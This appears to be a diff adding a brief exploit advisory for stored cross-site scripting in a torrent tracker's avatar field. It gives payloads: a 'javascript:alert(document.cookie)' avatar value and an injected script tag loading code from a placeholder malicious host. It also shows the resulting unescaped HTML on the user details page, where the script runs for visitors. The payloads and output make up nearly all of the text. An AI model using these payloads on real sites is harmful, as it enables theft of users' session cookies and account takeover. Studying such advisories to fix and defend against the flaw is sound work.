@@ -1,0 +1,24 @@
+version 11-10-05-BETA-SF1:111005 <=
+
+ $avatar = $_POST["avatar"];
+
+ where
+
+ $_POST["avatar"]=javascript:alert(document.cookie);
+  or
+ $_POST["avatar"]="><script 
+src=http://urlmaliciousJavaScript></script><";
+
+-> last version  <= 010306
+$_POST["avatar"]=javascript:alert(document.cookie);
+
+go to
+http://torrentvictim/userdetails.php?id=malicioususerprofileid
+the souce code is:
+...<tr><td class=rowhead>Avatar</td><td align=left><img src="\"><script
+src=http://urlmaliciousJavaScript><script><\""></td></tr>...
+
+or
+
+...<tr><td class=rowhead>Avatar</td><td align=left><img
+src="javascript:alert(document.cookie);"></td></tr>...
